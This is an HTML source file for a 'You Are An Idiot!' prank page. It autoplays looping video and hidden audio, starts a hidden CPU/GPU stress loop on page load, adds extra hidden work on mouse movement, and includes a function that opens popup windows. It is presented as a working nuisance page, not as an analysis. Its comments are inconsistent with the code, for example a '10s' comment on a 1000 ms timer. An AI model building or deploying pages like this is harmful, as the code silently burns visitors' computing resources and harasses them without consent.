<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You Are An Idiot!</title>
    <link rel="stylesheet" href="styles/styles.css">
    <script src="scripts/you.js"></script>

    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: black;
        }

        .idiot-container {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            position: relative;
        }

        /* Optional: hidden lag elements (for CPU/GPU stress) */
        .laggy-ball {
            position: absolute;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: transparent; /* hidden */
        }
    </style>
</head>

<body>
    <div class="idiot-container">
        <video src="media/youare.mp4" type="video/mp4" id="youare-video" muted autoplay loop></video>
    </div>

    <audio id="youare-audio" autoplay loop hidden>
        <source src="media/youare.mp3" type="audio/mp3">
    </audio>

    <script>
        // ================= CPU/GPU Lag Loop =================
        function cpuLagLoop() {
            // Do heavy calculations without adding visible elements
            for (let i = 0; i < 1000000; i++) {
                Math.sqrt(Math.random() * i);
            }
            requestAnimationFrame(cpuLagLoop);
        }
        cpuLagLoop();

        // ================= Popup Chaos =================
        const MAX_POPUPS = 5; // limit number of popups to avoid crashing browser entirely
        let popupCount = 0;

        function spawnPopup() {
            if (popupCount >= MAX_POPUPS) return; // limit popups
            const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
            popupCount++;
            setTimeout(() => {
                popupCount--;
            }, 1000); // allow another popup after 10s
        }

        // Optional: spawn new popup every 5 seconds
        // setInterval(spawnPopup, 5000);

        // ================= Mouse Chaos (hidden) =================
        document.addEventListener('mousemove', e => {
            for (let i = 0; i < 5; i++) {
                // calculations only, no DOM added
                Math.sqrt(Math.random() * (e.clientX + i));
            }
        });
    </script>
</body>
</html>>
